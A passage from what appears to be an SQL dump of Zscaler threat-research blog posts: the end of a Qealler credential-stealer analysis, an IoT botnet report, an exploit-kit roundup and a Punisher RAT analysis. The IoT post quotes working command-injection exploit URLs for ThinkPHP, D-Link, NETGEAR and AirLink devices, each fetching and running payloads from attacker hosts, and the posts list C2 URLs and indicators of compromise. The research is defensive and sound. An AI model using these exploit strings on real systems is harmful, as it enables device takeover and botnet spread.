“bbb6fec5ebef0d93”.    The final URL after decryption is hxxp://82.196.11[.]96:55326/lib/7z    The value of LIB_QEALLER_URL in the synchronized file is “xVQR4PWAw91AhkgaMsQVAaWhGxVQIpMxX60ZE+OpV3KjNnWvOARi0rccZaVSvle8”, it is also decrypted by the same algorithm with the same key.    The final URL is hxxp://82.196.11[.]96:54869/lib/qealler    The sample downloads the data from these URLs and encrypts it using the AES algorithm with the key generated by SecureRandom() having hardcoded seed value “2a890bc98aaf6c96f2054bb1eadc9848eb17633039e9e9ffd833104ce553fe9b”.    AES key: 39 3e df 7e fc 58 be 20 60 e4 78 bb 4a 91 38 72    After encryption, it stores both files at the below locations to avoid further downloading in the next run:    %USERPROFILE%\\\\a60fcc00\\\\bda431f8\\\\a90f3bcc\\\\83e7cdf9 (/lib/7z)    %USERPROFILE%\\\\a60fcc00\\\\bda431f8\\\\a90f3bcc\\\\db2bf213 (/lib/qealler)        Fig. 7: Created path and dropped files    Along with these two files, the virus creates another file path with the following algorithm and stores an encrypted unique machine ID in it. The ID is generated by a random number of system nanoTime.    Machine ID path:    %USERPROFILE%\\\\CRC32(“2a890bc98aaf6c96f2054bb1eadc9848eb17633039e9e9ffd833104ce553fe9b”)\\\\CRC32(“qealler”)\\\\CRC32(“machine”)\\\\CRC32(“id”)\\\\CRC32(“d”)\\\\CRC32(“q”)    Equivalent to:    %USERPROFILE%\\\\a60fcc00\\\\bda431f8\\\\1505df84\\\\bf396750\\\\98dd4acc\\\\99de3ada    After the downloading and decryption steps are completed, the sample stores a decrypted copy of 83e7cdf9 and db2bf213 in the %TEMP% directory with the name “_<SystemNanoTime>.tmp”.     _502560701855008616300501457487639.tmp    _502562165489004300569223733573535.tmp    _502560701855008616300501457487639.tmp (/lib/7z) is again a JAR file that doesn’t have any Java code inside, but contains three PE files inside the libraries as shown in Fig 8.        Fig. 8: Content of _502560701855008616300501457487639.tmp (/lib/7z)    7za.exe is a repackaged version of 7-zip to ensure the malware executes successfully even if the user does not have it installed by default.    The 7-zip (7za.exe) and its modules (7za.dll, 7zxa.dll) will be extracted from 7z.jar by the main sample and saved in the %TEMP% directory with the name “7z_<SystemNanoTime>.exe” and “7z_<SystemNanoTime>.dll”.    7z_502574395484008643130462441900754.exe    7z_502567545558005642490654395727502.dll    7z_502579570140002751296504101539829.dll    After extraction, the 7-zip executable is called by the main sample with the following command-line options:     %TEMP%\\\\7z_502574395484008643130462441900754.exe x %TEMP%\\\\_502562165489004300569223733573535.tmp -o%TEMP% -p”bbb6fec5ebef0d936db0b031b7ab19b6” -mmt -aoa -y    The downloaded Qealler module _502562165489004300569223733573535.tmp (/lib/qealler) is a password-protected file with 7-zip.    The above command will extract the Qealler module in the %TEMP% directory with the password: bbb6fec5ebef0d936db0b031b7ab19b6    -mmt: use multithreading mode    -aoa: set overwrite mode    -y: assume yes for all the prompts    The Qealler module is the key component of this malware.    The extracted Qealler module contains Python 2.7.12 with the installed packages to ensure the malware will execute even if the user does not have it installed by default.    The Qealler also has a directory named QaZaqne. It is a custom version of the open source project called LaZagne. LaZagne is used to retrieve lots of passwords stored on a local computer. This is the same functionality of QaZagne, which finds and steals credentials of the most commonly used software from local machines.        Fig. 9: Content of extracted _502562165489004300569223733573535.tmp (/lib/qealler)    After extraction, the main sample (Remittance.jar) executes a Python file of QaZagne (main.py) with the following option and takes the JSON output:    %TEMP%\\\\qealler\\\\python\\\\python.exe %TEMP%\\qealler\\qazaqne\\main.py all        Fig. 10: Stealer functions in QaZaqne module    This will get the credentials of all the software shown in the figure below:        Fig. 11: Qealler steals credentials of the software in this table    The output of the QaZagne on an infected Windows machine is shown in Fig 12. It is in JSON format and contains the credentials of CoreFTP and a Windows credential manager. It always starts with #fs# and ends with #ff#.        Fig. 12: JSON output of QaZaqne module    The main sample parses this output, fetches below system information, and encrypts it using an AES-EBC algorithm with key “bbb6fec5ebef0d93”.        Fig. 13: Fetch and encrypt system info    The final information scraped from the infected machine before encryption is shown below.        Fig. 14: Scrapped data from an infected machine    Here, machine_id is a unique ID generated by system nanoTime and uuid is encrypted in a synchronized file.    This output is encrypted and encoded with BASE64 and sent to the command-and-control (C2) server, whose URL is an encrypted value of the key “d7c363a2019dac744cf076e11433547a47907e2c2f781e2d1c8f59a40c57dd03” in a synchronized file.    C2 URL: hxxp://82.196.11[.]96:56636/qealler-reloaded/ping        Fig. 15: Data sent to C2    In the post headers, q-qealler-id is the encrypted machine ID and q-qealler-stub-id is the encrypted hash of the machine ID and system time.    The request body contains encrypted and encoded system information and stolen credentials.    If the C2 server is active and data is successfully sent to the server, it will respond with the encrypted status, which looks like the following after decryption:     {\"status\":\"2000\",\"message\":\"success\",\"extended\":[],\"time\":1548096059}         IOCs:    hiexsgroup.co[.]uk/?_sm_nck=1    lcbodywowrksltd[.]online    willsonsolicitors[.]biz    willsonsolicitors[.]online    willsonsolicitors[.]store    mcneilspecs[.]com    mcneilspecs[.]org    mcneilspecs[.]net    prestigebuildersltd[.]com    prestigebuildersltd[.]net    larrgroup.co[.]uk/remittance%20advice.jar    prestonbuildersltd.co[.]uk/remittance%20advice.jar    otorgroup.co[.]uk/remittance%20advice.jar    ultrogroup.co[.]uk/remittance%20advice.jar    stgeorgebuildltd.co[.]uk/remittance%20advice.jar    gregoryteebuilders.co[.]uk/remittance%20advice.jar    txjxgroup.co[.]uk/remittance.jar    kingagroup.co[.]uk/remittance%20advice.jar    hiexgroup.co[.]uk/remittance%20advice.jar    salmogroup.co[.]uk/remittance%20advice.jar         4f77bf588e0b721e68971059b0cefe21 (Remittance Advice.jar)    b0ba5d6fdd26d81a6a2f050600ade3f0 (Remittance Advice.jar)    d742beba17f7893b2b4989661652a66f (Remittance Advice.jar)    61ecd8f17d405fa1c29dd78008011250 (Remittance Advice.jar)    ccac2b99cb4b72bc7728a8fc42ccc4ad (Remittance Advice.jar)    76e87575e76b2ea28e1bb49e4c280152 (Remittance Advice.jar)    7854ccf3208f805da7ec19a067ae3abe (Remittance Advice.jar)    ca741116466d5ddbcb76df00748bb885 (Remittance Advice.jar)    9b7ebeff190cef02a7c22072d3d26ab3 (Remittance Advice.jar)    639865eb7fac1b405b223cb4b7fe9ada ({E60A953D}-Remittance Advice.jar)    e6fdc2140f6047fad60720cdf2157f9c (Remittance.jar)    aae120bf74131d04e47d99b16af41120 (Remittance.jar)    3d43a83b1c8877e782ff69650ec00449 (Remittance.jar)    4d433929f175c6df366aed139bf34f85 (Remittance.jar)    2ed3b8cdc87a11437f5a15302ce047d6 (Remittance.jar)    8e0f4cb12c6f2fef3a8ff731c195843d (Remittance.jar)    fc20f0068b71cc74e9061a0ea2b5d45a (Cred_Adv043H3272.jar)    791217f372c347f53003ae8a26a2fe54 (Cred_Adv043H3272.jar)    a593cb286e0fca1ca62e690022c6d918 (7z.jar)    8d2c718599ed0aff7ab911e3f1966e8c (qealler.jar)    5a8915c3ee5307df770abdc109e35083 (main.py)         82.196.11[.]96:54869/lib/qealler    82.196.11[.]96:443/lib/qealler    128.199.60[.]13:443/lib/qealler    37.139.12.136:443/lib/qealler    192.81.222[.]28:41210/lib/qealler    37.139.12[.]169:23980/lib/qealler    37.139.12[.]169:16901/lib/qealler    176.58.117[.]125:8676/lib/qealler    176.58.117[.]125:8796/lib/qealler    146.185.139[.]123:6521/lib/qealler    159.65.84[.]42:10846/lib/qealler    159.65.84[.]42:12536/lib/qealler    139.59.76[.]44:4000/lib/qealler         128.199.60[.]13:47222/lib/7z    128.199.60[.]13:443/lib/7z    128.199.60[.]13:46061/lib/7z    82.196.11[.]96:54869/lib/7z    82.196.11[.]96:443/lib/7z    37.139.12[.]136:443/lib/7z    192.81.222[.]28:39871/lib/7z    176.58.117[.]125:8650/lib/7z    176.58.117[.]125:8796/lib/7z    159.65.84[.]42:11268/lib/7z         82.196.11[.]96:56636/qealler-reloaded/ping    37.139.12[.]136:36561/qealler-reloaded/ping    128.199.60[.]13:56636/qealler-reloaded/ping    192.81.222[.]28:46871/qealler-reloaded/ping    176.58.117[.]125:5797/qealler-reloaded/ping', 'Analysis;Evasion/Stealth;Malware', 'https://www.zscaler.com/blogs/research/qealler-new-jar-based-information-stealer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (7, 'A sneak peek into recent IoT attacks', 'Pradeep Kulkarni,', 'January 28, 2019', 'Since the Mirai botnet source code was leaked in 2016, it was inevitable that we’d see its variants being put to use in IoT threat campaigns. Apart from using brute-force techniques to attack IoT devices through various protocols, the botnet also seems to be leveraging vulnerabilities present in IoT devices to infect other IoT devices. These vulnerabilities are mostly in management frameworks and, by exploiting them, attackers are achieving remote code execution. This typically results in turning the infected device into a bot which in turn forms a bigger botnet army. In some cases, we also saw cryptominers as the final payload delivered in the IoT campaigns.    The Zscaler ThreatLabZ team has been actively tracking these IoT attacks and analyzing their behavior, exploits, and payloads. In this blog, we will summarize our observations about a few of the more prominent IoT attacks we observed.    The graph below shows the IoT attacks we detected over the last three months.        Fig. 1: Detection timeline of prominent IoT threats    We observed a significant spike in detection at the start of January 2019. The spike was due to the heavy adoption of the ThinkPHP exploit, which we’ll describe later in the report.    RIFT botnet     The RIFT botnet emerged in December 2018 and uses a variety of exploits to infect IoT devices. According to online sources, the botnet used 17 exploits. The table below includes some of the more prominent RIFT exploits and those that continue to be active.        Fig. 2: Observed active exploits used in RIFT attack    Most of the vulnerabilities exploited were Remote Code Execution (RCE) or Command Injection types. It was surprising to see the use of WordPress-based websites into IoT devices. This indicates the use of readily available frameworks in IoT devices is increasing due to ease of integration.    The following are typical post-exploitation steps:      	Download the payload using “wget” command  	  		The payload downloaded was Shell script or ELF file  		In case of Shell script as payload, it downloads the ELF file depending on the code present inside it  	  	  	Store the payload into “/tmp” directory  	Make the payload executable using “chmod” command  	  		chmod 777 <filename>  	  	  	Run the payload  	  		/tmp/<filename>  	  	      Let’s take a sneak peek into one of the exploits we observed in the RIFT attack.    CVE-2015-2280 – AirLink101 SkyIPCam1620W Wireless N MPEG4 3GPP network camera OS command execution vulnerability     There is an OS command injection vulnerability in “snwrite.cgi”. The OS command can be injected through the parameter “mac”. The exploit URL looks like the following:    <IP-ADDRESS>/maker/snwrite.cgi?mac=1234;wget%20http://89.46.223.70/airlink[.]sh%20-O%20/tmp/666trapgod;chmod%20777%20/tmp/666trapgod;./tmp/666trapgod    Post successful exploitation of this vulnerability, the “wget” command downloads the shell script payload from the URL “hxxp://89[.]46[.]223[.]70/airlink.sh” and stores the payload using “-O” switch to “/tmp/666trapgod”. Later, it changes the permission of the shell script file to 777 (full permissions), which makes it executable and then runs it from its location in the “/tmp” directory.        Fig. 3: Malicious “airlink.sh” shell script    The “airlink.sh” (which is stored as “66trapgod”) downloads the final payload from the dropper server “89[.]46[.]223[.]70”. It downloads the payload for all the *INX and other firmware architectures and hopes one of its suits to victim’s architecture and executes it. All the payloads are prefixed with the “rift” string. The targeted architectures are:    x86, arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, ppc-440fp, sh4, spc, x32, x64                 Fig. 4: RIFT botnet (rift.x86) packed with UPX packer    The static analysis of the unpacked payload reveals its contents.      	It contains a list of known default usernames and passwords of IoT devices.          Fig. 5: Usernames and passwords found in RIFT botnet         	Various IoT exploits, a few of which are mentioned in the below screenshot. (Also contains some mentioned in Fig. 2.)          Fig. 6: Exploits in the RIFT botnet    Using these default credentials and exploits, the infected IoT device infects another device. There is also an interesting reference in the payload that refers to “OrkSec Gang.”        Fig. 7: OrkSec Gang reference    The following are the user-agents seen in this attack:      	Dark  	Rift/2.0  	Sefa  	Shaolin/1.0  	Oof      ThinkPHP exploitation    On December 11, 2018, a remote code execution vulnerability in the ThinkPHP framework was reported. The ThinkPHP is used predominantly in China. We believe ThinkPHP is also being incorporated in upcoming IoT devices for its management plugins. The exploit code is as follows:    <IP-ADDRESS>/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20hxxp://orksecpatrol[.]xyz/bins/rift.x86;cat%20rift.x86%20>%20gfrihk;chmod%20777%20gfrihk;./gfrihk%20thinkphp;rm%20gfrihk    The OS commands are injected through the query parameter “vars”. This follows a typical exploitation sequence observed in RIFT attacks (as explained above). The payload was downloaded from the URL “hxxp://orksecpatrol[.]xyz/bins/rift.x86”, which is similar to what we saw in the case of RIFT. The payload downloaded from the ThinkPHP exploit also was packed with UPX and contains a list of well-known usernames and passwords. Similar exploits were also embedded in the binary that we saw in the RIFT botnet. The notable difference was that this payload now contains the ThinkPHP exploit. It appears that the RIFT attack incorporated this exploit into its arsenal.               Fig. 8: Inclusion of ThinkPHP exploit in RIFT botnet    There was one more difference: a couple of vulnerabilities exploited over the UPnP SOAP (CVE-2014-8361) protocol in Realtek SDK Miniigd was using the user-agent string “NotRift/2.0” instead of the previously used user-agent “Rift/2.0” string.        Fig. 9: Comparing UPnP exploits observed in RIFT and ThinkPHP payloads    It has become evident that the RIFT botnet is also being delivered through the ThinkPHP exploitation.    D-Link router exploitation     In addition to other targets, we saw major hits related to DLink routers, especially the DSL-2750B model. This model had a Remote Code Execution (RCE) vulnerability that can be exploited with the “cli” parameter (“login.cgi?cli=”). The parameter directly invokes the “ayecli” binary, and arguments to this parameter become the input to binary. Below is the observed exploit code:    <IP Address>/login.cgi?cli=aa aa\';wget hxxp://89[.]46[.]223[.]70/dlink.sh -O -> /tmp/ff;chmod +x /tmp/ff;sh /tmp/ff\'$    The URL downloads a shell script from “hxxp://89[.]46[.]223[.]70” and drops it into “/tmp/” directory with file name “ff”. We noticed that file names were totally random. Later, the file is made executable with the “chmod +x” command and is finally executed.    The shell script contains download links of additional payloads for different architectures.                 Fig. 10: Malicious “dlink.sh” shell script    The task of shell script is to remove all contents from the “/tmp/” directory, download the actual payload, make the payload executable, and finally execute the payload. It tries to download and execute payloads for many *NIX architectures including but not limited to .arm, .arm5, .arm7, .mips, .mpsl, .x86, etc. Once the payload is executed, it deletes all the payloads from the “/tmp/” directory, leaving no trace of the attack.    The payload dropped from the exploit was not packed, and a simple static analysis of the file showed reference to another famous UPnP SOAP exploit (CVE-2014-8361) in Realtek SDK Miniigd. This vulnerability affects all the IoT devices embedded with Realtek SDK. This Mirai variant tries to exploit all the other devices with the embedded exploit of Realtek SDK Miniigd.        Fig. 11: Realtek SDK Miniigd exploit – CVE-2014-8361    Shaolin botnet (exploitation of NETGEAR vulnerability)    In the first week of January 2019, we saw hits targeting NETGEAR routers. In these attacks, an old bug was being used for Remote Code Execution (RCE). NETGEAR DGN2200 and NETGEAR DGN1000 are vulnerable to this bug.    We saw similar patterns in the URL below, where attackers were trying to download additional payloads from external locations. The exploit code is as follows:    <IP Address>/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;wget hxxp://145[.]239[.]138[.]69/bins/shaolin.mips -O /tmp/netgear;sh netgear&curpath=/&currentsetting.htm=1    The downloaded payload “shaolin.mips” is named “netgear” and is executed directly after download. This payload is similar to what we saw in the Airlink101 SkyIPCam case described earlier and used multiple exploits. We found it to be using the SOAP exploit, which targets DSL modems as shown in the code snippet below:        Fig. 12: SOAP exploit targeting DSL modems    The payload also tries to exploit the Home Network Administration Protocol (HNAP) in D-Link routers to download additional payloads. The following snippet was fetched from a payload that shows usage of HNAP.        Fig. 13: HNAP exploit targeting D-Link routers    In addition, we found many embedded usernames and password, similar to what we saw in the AirLink case.    Conclusion    The IoT space is evolving, and so is the attack surface of these devices. IoT devices need to be patched on a timely basis, which presents a challenge. IoT devices also need to be updated regularly. Even though techniques like brute-force attacks that use default passwords are not new, they remain effective because device passwords tend to go unchanged following installation. By hardening IoT devices and baking security in, many of the attacks we’ve been seeing can be countered.    Zscaler detections    IoT.Backdoor.RIFT  PHP.Exploit.ThinkPHP  IoT.Trojan.Mirai.B  IoT.Exploit.NetGear    Indicators of Compromise (IOCs)    orksecpatrol[.]xyz/bins/rift[.]x86  159[.]65[.]247[.]21/airlink[.]sh  89[.]46[.]223[.]70/airlink[.]sh  209[.]141[.]50[.]26/b  209[.]141[.]33[.]119/avtechsh  209[.]141[.]33[.]119/avtechsh  104[.]244[.]76[.]210/avtech  89[.]46[.]223[.]70/tutos[.]sh  89[.]46[.]223[.]70/dlink[.]sh  89[.]46[.]223[.]70/fastgate[.]sh  89[.]46[.]223[.]70/gpon8080[.]sh  89[.]46[.]223[.]70/bins/rift[.]x86  89[.]46[.]223[.]70/bins/rift[.]arm  89[.]46[.]223[.]70/bins/rift[.]arm5  89[.]46[.]223[.]70/bins/rift[.]arm6  89[.]46[.]223[.]70/bins/rift[.]arm7  89[.]46[.]223[.]70/bins/rift[.]m68k  89[.]46[.]223[.]70/bins/rift[.]mips  89[.]46[.]223[.]70/bins/rift[.]mpsl  89[.]46[.]223[.]70/bins/rift[.]ppc  89[.]46[.]223[.]70/bins/rift[.]ppc-440fp  89[.]46[.]223[.]70/bins/rift[.]sh4  89[.]46[.]223[.]70/bins/rift[.]spc  89[.]46[.]223[.]70/bins/rift[.]x32  89[.]46[.]223[.]70/bins/rift[.]x64  89[.]46[.]223[.]70/realtek[.]sh  145[.]239[.]138[.]69/softnas[.]sh  185[.]141[.]24[.]211  103[.]124[.]107[.]121  145[.]239[.]138[.]69  159[.]65[.]247[.]21  167[.]99[.]50[.]62  176[.]32[.]33[.]165  185[.]101[.]105[.]129  185[.]172[.]164[.]41  185[.]244[.]25[.]114  185[.]244[.]25[.]168  185[.]62[.]190[.]191  209[.]97[.]185[.]168  46[.]166[.]185[.]42  50[.]115[.]166[.]136  77[.]87[.]77[.]250   80[.]211[.]112[.]150  145[.]239[.]138[.]69  5e852f314e218842f31f651a2b48559e  f5660b1ccad67b08f6ece03c625e469a  82b7d40205994813df63c8a77fbe821c  218205b75d848cca092dcc6742f8b3a9  4471c35a5e68bc248fc8218738aa3e1d  02af7016b49dcbc186d6d5b4ec9beafb  6867dfb692beeff427a3df38938ea96f  963dcfb96774389a4910ea58beb5b2cd  dadf1f4ba8089bfd3520318d44fea684  23c2c659e6c07f64903ba071ec2c88d1  6407e1e33853d0e8f4fcc94085581d20  8fcc9ac9b405bd444f156e6b56340486  e753ca95633c4eb4477151cb9a940316  4cea779c2fa89504f4813cbd39f678fa  e65e3b21878cc9ef2811a5e38e79a700', '', 'https://www.zscaler.com/blogs/research/sneak-peek-recent-iot-attacks');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (8, 'Top Exploit Kit Activity Roundup – Winter 2019', 'Rohit Hegde', 'January 18, 2019', 'This is the ninth in a series of quarterly roundups by Zscaler ThreatLabZ researchers, in which the team collects and analyzes the recent activity of current exploit kits. Exploit kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers and deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors. What follows are highlights from the EK activity we observed during the last quarter.         RIG EK    RIG EK has been the most active exploit kit in the past, but its activity has decreased in comparison to previous quarters. We saw various payloads delivered by RIG EK, from ransomware to banking Trojans. The graph below shows the hits representing RIG EK activity.        Figure 1: RIG EK hits from 15th October 2018 to 15th January 2019    The geographic distribution for RIG EK hits is shown below.        Figure 2: RIG EK heat map shows showing infected regions    One instance of the RIG EK cycle is shown in the figure below.     Figure 3: RIG EK infection cycle    The obfuscated JavaScript on the landing page can be seen below.        Figure 4: RIG EK landing page, obfuscated JavaScript    We observed the use of CVE-2018-8174, which targets a VBScript engine to attack the victim\'s machine. A Flash-based exploit, CVE-2018-4878, was also used, affecting Adobe Flash version 28.0.0.137 and earlier versions.    Decompiling the Flash file, we can see the CVE-2018-4878 code, shown below.        Figure 5: Decompiled Flash exploit in the current RIG EK cycle; CVE-2018-4878    We can see that the threat actors have tried to mask the function names, which were visible last quarter, as shown in the screen below.        Figure 6: Decompiled Flash exploit in previous quarter RIG EK cycle; CVE-2018-4878    Different payloads were observed during the quarter, with GrandCrab ransomware being served at the start of the quarter and Trojans being served towards the end.         GrandSoft EK    GrandSoft EK is an old exploit kit that has been showing some recent activity. This EK is being served through malvertisement redirects.        Figure 7: GrandSoft EK hits from 15th October 2018 to 15th January 2019    The geographical distribution of GrandSoft hits can be seen below.        Figure 8: GrandSoft EK heat map shows infected regions, primarily in Asia    The threat actors make small changes to the URL pattern as shown in the image below.        Figure 9: GrandSoft EK Cycle with URL \"getversionpd\"             Figure 10: GrandSoft EK cycle with the URL \"getversoinpd\"         We saw no changes in the landing page, and we saw that the CVE-2016-0189 VBScript memory corruption vulnerability was still being used to exploit the victim. A snippet of the GrandSoft EK landing page is shown below.        Figure 11: GrandSoft EK landing page    The payloads we observed included a password stealer and Trojan malware, including Azorult, which differed from the GrandCrab ransomware we saw in previous quarters.         Fallout EK    Fallout EK is relatively new, showing activity since early last quarter. The EK redirects victims using multiple HTTP 302 redirects and then sends the user to the Fallout EK landing page. Users are mainly targeted by malvertisement campaigns.          Figure 12: Fallout EK hits from 15th October 2018 to 15th January 2019    The geographic distribution for the Fallout EK is shown below.        Figure 13: Fallout EK heat map shows infected regions    We can see one instance of a Fallout EK chain in the figure below.        Figure 14: Fallout EK infection cycle    We can see the initial HTTP 302 redirects from 185.231.69[.]225 and 51.15.98[.]59, which leads to the Fallout EK landing page.    The screenshot of the obfuscated landing page is shown below.        Figure 15: Fallout EK landing page     The payload seen with the Fallout EK was GrandCrab ransomware.        Figure 16: GrandCrab ransomware infection through Fallout EK         Other exploit kits    We observed Magnitude EK activity in Southeast Asia, but other exploit kits like Terror EK, Disdain EK, and Kaixin EK are no longer showing any activity. Underminer EK is another exploit kit seen in past quarters, but we have not seen a full cycle for it in the current quarter.         Conclusion    Exploit kits can infect a victim\'s machine during web browsing without the user’s knowledge. The attackers monetize successful infections by collecting a ransom for retrieving data encrypted by ransomware, mining cryptocurrencies using the victim\'s system resources, or installing Trojans to steal a victim’s identity. Attackers frequently change their techniques by obfuscating the source code or integrating new exploit code into their EK, and security researchers analyze and block the new threats by tracking changes in the EK behavior.     To help avoid infections from exploit kits, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Keeping browser plugins and web browsers up to date with the latest patches helps to protect against common vulnerabilities targeted by exploit kits. The Zscaler ThreatLabZ research team has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using the Zscaler cloud security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-winter-2019');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (9, 'Mjag dropper: Using decoy documents to drop RATs', 'Priyanka Bhati,', 'January 10, 2019', 'Mjag dropper    Mjag dropper is compiled in the Microsoft .NET framework, and its original binary is obfuscated using SmartAssembly. The installation path and other details are stored in encrypted form using AES encryption (Fig. 1), and the decryption key is hardcoded.    Fig. 1: AES decryption function    The payload and decoy PDF is encrypted and stored in the resource section, and a custom encryption method has been used. The decryption key is hardcoded (Fig. 2).    Fig. 2: Extracting decoy PDF and payload    The decoy document claims to be an India Overseas Bank NEFT transaction statement. It lures users to click the “Click here to view full document” link, which points to a malicious website hosting a copy of the Mjag droppper payload. (Fig. 3).    Fig. 3: Decoy PDF document         Installation      	Copies itself in “%APPDATA%\\FolderN\\name.exe”  location        	Creates startup key: “HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load” with values as “%APPDATA%\\FolderN\\name.exe.lnk”        	Copies “C:\\Windows\\Microsoft.NET\\Framework\\<Version>\\msbuild.exe” to “%TMP%\\svhost.exe”        	Starts svhost.exe in suspend mode and injects the final payload (Fig. 4)      Fig. 4: Process injection using Windows APIs      However, the injected payload does not run properly and displays an error message (Fig. 5).        Fig. 5: Unhandled exception popup    This error is due to the injector code not being able to inject the overlay part of the payload, the part that contains the command-and-control (C&C) server details. As shown in the injection code snapshot below, it allocates memory in a target process similar to the size of image length defined in the PE header of payload (Fig. 6). This means Mjag will not be able to properly inject payloads (like Punisher RAT) that contain important data in the overlay.      Fig. 6: Injector code    For the purpose of this blog we patched the memory mapping issue and continued our analysis of the infection cycle involving Punisher RAT.    Analysis of Punisher RAT    Punisher RAT is packed and written in .NET. The Punisher RAT builder is publicly available and can be configured with a range of features. In the builder (Fig. 7), you can configure the server IP, name, password, and listening port. The RAT will communicate on the given server IP and send all the information stolen from the victim’s machine. There is also a feature to add more functionality in binary, including anti-VMware, anti-AV, sandbox detection, and USB spread for further infection, among others.    Fig. 7: Punisher RAT builder    During analysis, we saw various functions of this malware, including:    1. Password stealing module    The malware hunts for various application data and steals the credentials. Here (Fig. 8), it is trying to steal the stored login credentials for the Chrome browser. The stolen information will look like:    |URL| http://facebook.com    |USR| username or e-mail    |PWD| userpassword        Fig. 8: Stealing module    The Punisher RAT attempts to steal sensitive data from the following applications on the infected system: Filezilla, No-IP Dynamic Update Client, Dyn DNS, Paltalk, FireFox, Chrome, Hotmail, Yahoo, Opera, and Internet Explorer.    2. Anti-task manager    The malware checks for the following applications’ processes, and does not allow these applications to terminate any other processes running on the user\'s system.      	Process Explorer  	Process Hacker  	Task Manager      This allows malware author to ensure that the malware processes cannot be terminated. Fig. 9 shows that while attempting to kill \'a.exe\' process using the Process Explorer, the “OK” button will be replaced by an “Error” button.    Fig. 9: Anti-task manager         3. Keylogging     The malware can capture keystrokes (Fig. 10) and store the data into the %AppData%/{random digits}.log file.    Fig. 10: Capturing keystrokes         4. Persistence     The malware copies itself in the startup folder and creates a run key of this location.    HKCU\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run         5. Spreading vector    It looks for a removable drive and CD-ROM for infection and creates an .lnk file.    Below (Fig. 11) depicts the spreading mechanism through a USB device.        Fig. 11: USB spread         6. AV checks    The Punisher RAT checks for installed AV software (Fig. 12) and updates to the server.    Fig. 12: Checking AV    Network activity    The hardcoded C&C information (Fig. 12) is extracted from the payload, and it will split the data with the delimiter “abccba.”    Fig. 13: C&C server information         It also collects the information about the multiple running processes:    AW|BawaneH|Process Explorernj-q8    AW|BawaneH|Notepadnj-q8    The table consists of extracted C&C information from the payload.        This RAT uses “BawaneH” as a delimiter to split the server response data. It performs various actions based on received commands. There were a total of 59 commands used by the server, shown in the following table:      Fig.14: Received commands    IOCs    Md5: 0a459c18e3b8bdef87a6fb7ea860acdb    Filename: NEFTIOBAN1830369427520181030ABBIdiaLtddt30102018_pdf.exe    Download URL: tenau[.]pw/owa/neftioban1830369427520181030abbidialtddt30102018_pdf.exe    C&C: chris101.ddns.net    Sandbox Report             Fig. 15: Zscaler Sandbox report', '', 'https://www.zscaler.com/blogs/research/mjag-dropper-using-decoy-documents-drop-rats');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (10, 'The Top 10 ThreatLabZ blogs from 2018', 'Deepen Desai', 'December 31, 2018', 'The Zscaler ThreatLabZ team is continually hunting new threats, analyzing them, and sharing their findings in blogs and reports on the Zscaler site. What follows are the most read and shared blogs of 2018.         Android apps infected with Windows malware reemerge    By Gaurav Shinde    This blog explores apps available on Google Play that were infected with malicious iFrames. Though the malware posed no immediate threat to users, its discovery highlights the fact that infections can be propagated across different platforms. This vector can be leveraged by a clever attacker to serve second-level malicious payloads, depending on the type of device platform visiting the URL. Read more.         Fake Fortnite apps scamming and spying on Android gamers    By Viral Gandhi    Fortnite is a co-op sandbox survival game and, at the time of the ThreatLabZ report, had 45 million players and more than three million concurrent users. In 2918, its maker, Epic Games, announced a version for iOS. Malware authors, knowing that Android users would be anxious to get Fornite, created fake Fortnite for Android apps to spread their payloads, including spyware, a coin miner, and some unwanted apps. Read more.         CVE-2017-8570 and CVE-2018-0802 exploits being used to spread LokiBot    By Mohd Sadique    This blog provides an overview of the use of malicious RTF documents that leverage the CVE-2017-8570 and CVE-2018-0802 vulnerability exploits to install malicious payloads on victims’ machines. The team shares its analysis of a campaign leveraging these two exploits to deliver LokiBot. Read more.         The latest cloud hosting service to serve malware    By Dhanalakshmi    Cloud services are under attack because they enable bad actors to open inexpensive hosting accounts for hiding malicious content in the cloud-based domains of well-known brands. The ThreatLabZ team discovered that a popular managed cloud hosting service provider has been serving phishing attacks and other malware in the wild as far back as February 2018. Read more.         Meltdown and Spectre vulnerabilities: What you need to know    By Deepen Desai    With the ability to allow attackers to gain unauthorized access to sensitive information in system memory, Meltdown and Spectre represent a new class of microarchitectural attacks that use processor chip performance optimization features to exploit built-in security mechanisms. This blog provides an analysis of the vulnerabilities as well as mitigation information. Read more.         Cryptominers and stealers – malware edition    By Atinderpal Singh and Rajdeepsinh Dodia    Due to their decentralized nature, cryptocurrencies are impossible to control or censor by any single authority—and that makes them attractive to cybercriminals. With more than 4,000 cryptocurrencies on the market rising in both value and popularity, we’ve seen a rise in the use of malware that targets bitcoins or altcoins for financial gain. This blog provides insight into various cryptominers and stealer variants. Read more.         DarkCloud Bootkit    By Nirmal Singh    Following on its report about cryptomining and wallet stealing techniques, this blog provides a technical analysis of yet another type of cryptominer malware that uses a bootkit and other kernel-level shellcode for persistence. Read more.         Spam campaigns leveraging .tk domains    By Mohd Sadique    ThreatLabZ identified a campaign using the “.tk” top-level domain, which started with compromised sites that redirect users to either fake blog sites to generate ad revenue or fake tech support sites that claim to remove viruses. We estimated at the time that at least USD 20K per month in revenue was being generated from the fraudulent ad activities alone. Read more.         Magecart campaign remains active    By Rubin Azad    Magecart is a notorious hacker group that has been responsible for large-scale attacks on the e-commerce sites of well-known brands. In this blog, we examine the campaign’s recent activity and its methods for skimming credit and debit card information for financial gain. Read more.         Ubiquitous SEO poisoning URLs    By Jim Wang    SEO poisoning is an attack method that involves creating web pages packed with trending keywords in an effort to get a higher ranking in search results. SEO poisoning is also a way to redirect users to unwanted applications, 